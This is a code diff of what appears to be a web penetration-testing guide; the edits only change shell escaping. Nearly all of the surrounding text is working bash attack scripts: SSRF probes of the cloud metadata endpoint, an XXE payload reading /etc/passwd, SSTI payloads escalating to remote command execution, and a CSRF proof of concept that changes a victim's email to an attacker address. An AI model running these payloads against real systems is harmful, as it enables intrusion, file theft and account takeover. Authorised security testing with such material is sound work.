@@ -37,9 +37,9 @@ internal_targets=(
 )
 
 for target in "\${internal_targets[@]}"; do
-  response=\$(curl -s -H "Cookie: \$SESSION" "\$TARGET?url=\$target")
-  if echo "\$response" | grep -qiE "ami-|metadata|private"; then
-    echo "[+] SSRF: Accessed \$target"
+  response=$(curl -s -H "Cookie: $SESSION" "$TARGET?url=$target")
+  if echo "$response" | grep -qiE "ami-|metadata|private"; then
+    echo "[+] SSRF: Accessed $target"
   fi
 done
 \`\`\`
@@ -54,7 +54,7 @@ TARGET="[TARGET_URL]"
 SESSION="[SESSION_COOKIE]"
 
 # The internal target that was accessible:
-curl -s -H "Cookie: \$SESSION" "\$TARGET?url=http://169.254.169.254/latest/meta-data/"
+curl -s -H "Cookie: $SESSION" "$TARGET?url=http://169.254.169.254/latest/meta-data/"
 \`\`\`
 
 ## XXE (XML External Entity)
@@ -72,12 +72,12 @@ XXE_PAYLOAD='<?xml version="1.0"?>
 ]>
 <foo>&xxe;</foo>'
 
-response=\$(curl -s -X POST "\$TARGET" \\
-  -H "Cookie: \$SESSION" \\
+response=$(curl -s -X POST "$TARGET" \\
+  -H "Cookie: $SESSION" \\
   -H "Content-Type: application/xml" \\
-  -d "\$XXE_PAYLOAD")
+  -d "$XXE_PAYLOAD")
 
-if echo "\$response" | grep -qE "root:x:"; then
+if echo "$response" | grep -qE "root:x:"; then
   echo "[+] XXE: File read successful"
 fi
 \`\`\`
@@ -92,8 +92,8 @@ TARGET="[TARGET_URL]"
 SESSION="[SESSION_COOKIE]"
 
 # The XXE payload that worked:
-curl -s -X POST "\$TARGET" \\
-  -H "Cookie: \$SESSION" \\
+curl -s -X POST "$TARGET" \\
+  -H "Cookie: $SESSION" \\
   -H "Content-Type: application/xml" \\
   -d '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>'
 \`\`\`
@@ -124,12 +124,12 @@ ssti_detection_payloads=(
 )
 
 for payload in "\${ssti_detection_payloads[@]}"; do
-  encoded=\$(echo -n "\$payload" | jq -sRr @uri)
-  response=\$(curl -s "\$TARGET?param=\$encoded")
+  encoded=$(echo -n "$payload" | jq -sRr @uri)
+  response=$(curl -s "$TARGET?param=$encoded")
 
   # Key indicator: 49 appears instead of the literal expression
-  if echo "\$response" | grep -q "49"; then
-    echo "[+] SSTI DETECTED with: \$payload"
+  if echo "$response" | grep -q "49"; then
+    echo "[+] SSTI DETECTED with: $payload"
     echo "[*] Template engine evaluates expressions - escalate to RCE"
   fi
 done
@@ -167,7 +167,7 @@ erb_rce=(
 
 # Freemarker RCE payloads
 freemarker_rce=(
-  "\${\"freemarker.template.utility.Execute\"?new()(\"id\")}"
+  "\${"freemarker.template.utility.Execute"?new()("id")}"
 )
 \`\`\`
 
@@ -182,16 +182,16 @@ SESSION="[SESSION_COOKIE]"
 
 # STEP 1: Confirm SSTI
 echo "[*] Testing for SSTI..."
-response=\$(curl -s "\$TARGET?param={{7*7}}")
-if echo "\$response" | grep -q "49"; then
+response=$(curl -s "$TARGET?param={{7*7}}")
+if echo "$response" | grep -q "49"; then
   echo "[+] SSTI confirmed - template evaluates expressions"
 fi
 
 # STEP 2: Escalate to RCE
 echo "[*] Escalating to RCE..."
 RCE_PAYLOAD="<%= \\\`whoami\\\` %>"  # Adjust based on detected engine
-response=\$(curl -s "\$TARGET?param=\$(echo -n "\$RCE_PAYLOAD" | jq -sRr @uri)")
-echo "[+] RCE Result: \$response"
+response=$(curl -s "$TARGET?param=$(echo -n "$RCE_PAYLOAD" | jq -sRr @uri)")
+echo "[+] RCE Result: $response"
 \`\`\`
 
 ### SSTI vs XSS - Key Distinction
@@ -210,8 +210,8 @@ echo "[+] RCE Result: \$response"
 
 \`\`\`bash
 # Check for CSRF token requirement
-response=\$(curl -s "\$TARGET/settings")
-if ! echo "\$response" | grep -qiE "csrf|_token|authenticity_token"; then
+response=$(curl -s "$TARGET/settings")
+if ! echo "$response" | grep -qiE "csrf|_token|authenticity_token"; then
   echo "[+] No CSRF token detected - may be vulnerable"
 fi
 \`\`\`
@@ -231,22 +231,22 @@ SESSION="[SESSION_COOKIE]"
 
 # STEP 2: DEMONSTRATE CSRF - Show request succeeds WITHOUT csrf token
 echo "[*] CSRF POC: State-changing request without CSRF token"
-echo "[*] Target: \$TARGET"
+echo "[*] Target: $TARGET"
 echo ""
 
 # Make the state-changing request WITHOUT any CSRF token
-response=\$(curl -s -w "\\nHTTP_CODE:%{http_code}" \\
-  -X POST "\$TARGET/change-email" \\
-  -H "Cookie: \$SESSION" \\
+response=$(curl -s -w "\\nHTTP_CODE:%{http_code}" \\
+  -X POST "$TARGET/change-email" \\
+  -H "Cookie: $SESSION" \\
   -H "Content-Type: application/x-www-form-urlencoded" \\
   -d "email=attacker@evil.com")
 
-HTTP_CODE=\$(echo "\$response" | grep "HTTP_CODE:" | cut -d: -f2)
-BODY=\$(echo "\$response" | grep -v "HTTP_CODE:")
+HTTP_CODE=$(echo "$response" | grep "HTTP_CODE:" | cut -d: -f2)
+BODY=$(echo "$response" | grep -v "HTTP_CODE:")
 
 # Verify the request succeeded (state change occurred)
-if [ "\$HTTP_CODE" = "200" ] || [ "\$HTTP_CODE" = "302" ]; then
-  if echo "\$BODY" | grep -qiE "success|updated|changed|saved"; then
+if [ "$HTTP_CODE" = "200" ] || [ "$HTTP_CODE" = "302" ]; then
+  if echo "$BODY" | grep -qiE "success|updated|changed|saved"; then
     echo "[+] CSRF CONFIRMED - State change occurred without CSRF token"
     echo "[+] An attacker could craft an HTML page to exploit this"
     exit 0
